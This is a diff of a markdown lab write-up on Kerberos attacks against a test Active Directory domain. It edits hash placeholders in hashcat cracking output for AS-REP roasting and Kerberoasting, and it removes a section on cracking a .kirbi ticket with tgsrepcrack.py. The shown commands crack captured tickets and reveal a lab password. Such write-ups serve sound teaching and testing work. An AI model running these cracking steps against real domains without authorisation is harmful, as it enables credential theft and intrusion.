@@ -170,8 +170,8 @@ $krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe4
 └─# time hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
-$krb5asrep$23$mike@LAB.VX:<hash-truncated>:P@ssw0rd
-$krb5asrep$23$luke@LAB.VX:<hash-truncated>:P@ssw0rd
+$krb5asrep$23$mike@LAB.VX:•••hash-truncated•••:P@ssw0rd
+$krb5asrep$23$luke@LAB.VX:•••hash-truncated•••:P@ssw0rd
 
 Session..........: hashcat
 Status...........: Cracked
@@ -653,7 +653,7 @@ It doesn't matter that `rockyou.txt` has 14 million records, the time taken by h
 └─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ⋮
-$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*<hash-truncated>:P@ssw0rd
+$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*•••hash-truncated•••:P@ssw0rd
 
 Session..........: hashcat
 Status...........: Cracked
@@ -665,38 +665,6 @@ Stopped: Wed Oct 26 20:52:13 2022
 real    0m27.158s
 user    0m25.597s
 sys     0m0.333s
-```
-
-## 4.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)
-
-- It is possible to crack the .kirbi ticket exported from mimikatz directing using the `tgsrepcrack.py` script, but it is extremely slow compared to hashcat
-- Time taken for `tgsrepcrack.py`:
-
-| Number of passwords | Time taken |
-|---|---|
-| 10,000 | 0m4.974s |
-| 100,000 | 0m47.707s |
-| 1,000,000 | 8m14.453s |
-
-- Using the full `rockyou.txt`, which as 14 million records, is near impossible using this method
-
-#### Crack the ticket
-
-```console
-┌──(root㉿kali)-[~]
-└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
-
-
-    USE HASHCAT, IT'S HELLA FASTER!!
-
-
-Cracking 1 tickets...
-found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
-Successfully cracked all tickets
-
-real    0m47.861s
-user    0m47.828s
-sys     0m0.016s
 ```
 
 ## 4.5. Silver Ticket
